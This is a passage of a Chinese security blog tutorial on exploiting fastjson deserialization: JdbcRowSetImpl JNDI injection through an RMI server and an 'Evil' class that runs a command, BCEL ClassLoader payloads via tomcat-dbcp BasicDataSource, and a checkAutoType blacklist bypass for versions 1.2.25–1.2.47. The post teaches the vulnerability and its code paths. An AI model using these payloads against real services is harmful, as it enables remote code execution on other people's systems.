class="keyword">else</span> &#123;</span><br><span class="line">       dataSource = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    URL = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>我们可以控制dataSource的值,即完成了lookup()函数参数外部可控的条件，可以打JNDI注入<br>jdk版本需要满足 8u161 &lt; jdk &lt; 8u191<br><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:8888/evil&quot;,&quot;autoCommit&quot;:true&#125;</code><br>本地起了一个恶意类的服务<br>最好了解下RMI,Evil是恶意类，常见RMIServer服务端，绑定恶意的Reference到rmi注册表</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;    <span class="comment">// 实现接口ObjectFactory，不然会报错，虽然不影响执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  <span class="comment">// 构造方法，加载时会自动调用</span></span><br><span class="line">        exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">runcmd</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(runcmd.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        String tmp;</span><br><span class="line">        <span class="keyword">while</span> ((tmp = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NamingException &#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//初始化环境</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建一个注册表</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 绑定恶意的Reference到rmi注册表</span></span><br><span class="line">        <span class="comment">// 注意，classFactoryLocation地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        ctx.bind(<span class="string">&quot;evil&quot;</span>, referenceWrapper);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h4 id="BCEL利用链"><a href="#BCEL利用链" class="headerlink" title="BCEL利用链"></a>BCEL利用链</h4><p>BasicDataSource只需要有dbcp或tomcat-dbcp的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接<br>安装一下依赖  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>看一下payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">      <span class="string">&quot;aaa&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">              <span class="comment">//这里是tomcat&gt;8的poc，如果小于8的话用到的类是org.apache.tomcat.dbcp.dbcp.BasicDataSource</span></span><br><span class="line">              <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;:<span class="string">&quot;bbb&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>上述payload是<code>JSONObject.parse(jsonString)</code>时<br>如果是parseObject()的形式，payload也可以如下:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">  <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$xxxxxxxxxxxx&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这样也可以<br>跟进类的实现<br>看一下BasicDataSource.getConnection方法<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152845680.png"><br>再跟进createDataSource方法<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152853665.png"><br>继续createConnectionFactory方法<br>发现<br><code> driverFromCCL = Class.forName(this.driverClassName, true, this.driverClassLoader);</code><br>这两个参数都是可以通过setter可控的<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152855782.png"><br>而这个包里面的类com.sun.org.apache.bcel.internal.util.ClassLoader重写了ClassLoader#loadClass()方法，即</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其会判断类名是否是$$BCEL$$开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩。会创建一个该类，并用definclass去调用</span><br></pre></td></tr></table></figure></div>
+<p>那么现在问题变成了为什么它会这样走，为什么回执行getConnection方法呢</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先在&#123;“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……&#125; 这一整段外面再套一层&#123;&#125;，这样的话会把这个整体当做一个JSONObject，会把这个当做key，值为bbb</span><br><span class="line">将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法  </span><br><span class="line">而且JSONObject是Map的子类，当调用toString的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到getConnection方法。</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47"></a>1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</h3><p>在此版本中，官方新加了黑白名单，在 ParserConfig 中可以看到黑名单的内容。而且设置了一个 autoTypeSupport 用来控制是否可以反序列化，autoTypeSupport 默认为 false 且禁止反序列化，为true时会使用 checkAutoType 来进行安全检测<br>如何绕过黑名单呢?零零碎碎的每个版本都有一些方法，这边介绍比较广的<br>在不开启 AutoTypeSupport 的情况下进行反序列化的利用</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;111&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;222&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>跟进checkAutoType<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152821956.png"><br>由于前面第一部分JSON数据中的val键值User已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测  </p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://infernity.top/2025/02/25/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8">https://infernity.top/2025/02/25/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18435525">https://www.cnblogs.com/gaorenyusi/p/18435525</a><br><a target="_blank" rel="noopener" href="https://townmacro.cn/">https://townmacro.cn</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">fastjson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">fastjson反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">1.2.1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplateImpl"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">TemplateImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">BCEL利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=fastjson反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=fastjson反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson反序列化&body=Check out this article: https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=fastjson反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=fastjson反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
